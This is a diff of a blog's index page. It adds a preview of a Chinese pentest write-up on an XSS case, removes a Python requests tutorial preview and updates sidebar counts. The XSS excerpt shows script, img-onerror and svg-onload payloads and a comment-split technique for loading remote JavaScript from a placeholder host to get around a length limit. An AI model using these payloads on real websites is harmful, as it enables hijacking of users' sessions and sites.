@@ -82,6 +82,61 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
+        <h2><a href="http://wyb0.com/posts/xss-example/">XSS实例</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 0px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2016-07-17</time>
+            </div>
+
+            
+
+            <div style="padding:2px 5px 2px 0px;">
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/xss">xss</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        首先感谢凯神的指导。。。
+0x00 注册账号  先得到一个临时邮箱，然后注册账号  0x01 找输入输出点   0x02 尝试构造payload  payload用如下的即可：
+&lt;script&gt;alert(1)&lt;/script&gt; &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a  但是这个要在点击删除时payload才起作用 也可用&lt;img src=1 onerror=alert(1) /&gt;自动加载，但也要点击删除按钮才能起作用 但是我们若想充分利用则需要远程加载自己的js   0x03 加载自己的js  此时的限制条件为：   * 30个字符 * script标签不能自己触发    只能构造类似下面的语句自己加载脚本：   a=document.createElement('script'); a.src=&quot;www.xxx.com&quot;; document.head.appendChild(a);    可以用如下方法分割，多次添加：   a=document.createE/* */lement('script');/* */a.src=&quot;www.xxx.com&quot;;/* */document.head.app/* */endChild(a); 但此处不可行，考虑直接用JQuery等的函数getScript(URL)直接加载url，然而此处依然不行    查找  构造payload    使用如下payload： &lt;svg/onload=&quot;b='http://t.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/xss-example/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
         <h2><a href="http://wyb0.com/posts/xss-use-and-defense/">XSS漏洞挖掘与利用</a></h2>
 
         
@@ -574,61 +629,6 @@ DMZ区网段为：172.16.1.0/24  iptables的策略  新建iptables.sh,内容如
 
 
             
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="http://wyb0.com/posts/python-module-requests/">Python的requests模块</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 0px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>2016-07-02</time>
-            </div>
-
-            
-
-            <div style="padding:2px 5px 2px 0px;">
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/python">Python</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/python">python</a>&nbsp;&#47;
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/module">module</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 无参数的get请求  import requests resp = requests.get('http://www.baidu.com',timeout=1) #设置超时，超时后抛出timeout错误 print resp.text #一般用来输出纯文本，可得到unicode类型字符串 print resp.content #一般用来输出pdf、图片等，可得到原网页设定类型的字符串   0x01 有参数的get请求  import requests url = 'http://10.10.10.10:8080/Lab2.0/Login.action' header = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0', } param = {'aaa':'1111','bbb':'2222'} resp = requests.get(url,params=param,headers=header) print resp.url #得到url print resp.status_code #得到返回的状态码 print resp.headers #得到html头 print resp.cookies #得到cookie   0x02 POST请求  import requests url1 = 'http://10.10.10.10:8080/Lab2.0/Login.action' url2 = 'http://10.
-    </p>
-
-    
-    <footer>
-        <a href="/posts/python-module-requests/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-    </footer>
-    
-</article>
-
-
-            
 
             
 
@@ -666,7 +666,7 @@ DMZ区网段为：172.16.1.0/24  iptables的策略  新建iptables.sh,内容如
         
             <li style="list-style-type:none;"><a href="http://wyb0.com/topics/javascript" title="javascript">javascript(5)</a></li>
         
-            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/linux" title="linux">linux(23)</a></li>
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/linux" title="linux">linux(24)</a></li>
         
             <li style="list-style-type:none;"><a href="http://wyb0.com/topics/miscellanea" title="miscellanea">miscellanea(3)</a></li>
         
@@ -736,7 +736,7 @@ DMZ区网段为：172.16.1.0/24  iptables的策略  新建iptables.sh,内容如
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/docker" title="docker">docker</a>
-                <sup>2</sup>
+                <sup>3</sup>
             </p>
         
             <p style="display:inline-block;">
